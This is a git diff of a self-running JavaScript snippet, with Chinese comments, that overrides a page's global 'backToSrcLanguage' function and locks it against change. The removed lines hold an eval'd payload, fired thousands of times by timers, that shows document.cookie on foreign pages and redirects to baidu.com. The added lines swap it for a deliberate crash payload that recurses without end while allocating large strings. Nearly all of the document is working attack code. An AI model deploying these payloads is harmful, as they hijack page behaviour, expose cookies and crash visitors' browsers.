@@ -1,42 +1,30 @@
 (function() {
     'use strict';
     
-    console.log('🔗 简化跨域跳转系统');
+    console.log('💥 立即栈溢出崩溃');
     
-    // 直接定义一个能跳转的函数
     Object.defineProperty(window, 'backToSrcLanguage', {
-        value: function() {
-            console.log('🚀 backToSrcLanguage 被调用');
-            const currUrl = location.href;
-            const payload = `
-            console.log('payload加载');
-            if (!location.href.startsWith("https://ideet.github.io") && !window.__cloudx_called) {
-                window.__cloudx_called = true;
-                Object.defineProperty(window, 'backToSrcLanguage', {
-        value: function() {alert(document.cookie)},
-        writable: false,
-        configurable: false});
-            console.log('payload加载成功');
-            }
-        `;
-            for (let i = 0; i < 4000; i++) {
-            setTimeout(function () {
-                    eval(payload);
-                    window.backToSrcLanguage();
+        value: function immediateStackOverflow() {
+            console.log('💣 触发立即栈溢出');
+            
+            // 方法A：无出口递归（最快崩溃）
+            function crashNow(depth = 0) {
+                // 创建大对象增加压力
+                const obj = {};
+                for (let i = 0; i < 1000; i++) {
+                    obj['key_' + i] = '💣'.repeat(1000);
+                }
                 
-            }, i);
-        }
+                // 立即递归，无返回条件
+                return crashNow(depth + 1) + obj;
+            }
             
-            // 方法1：直接跳转（最简单）
-            console.log('🔗 直接跳转到百度...');
-            window.location.href = "https://www.baidu.com";
-            
-            return 'redirecting_to_baidu';
+            // 直接调用，立即触发栈溢出
+            return crashNow();
         },
         writable: false,
         configurable: false
     });
     
-    console.log('✅ backToSrcLanguage 函数已定义');
-    
+    console.log('✅ 立即崩溃函数已定义');
 })();
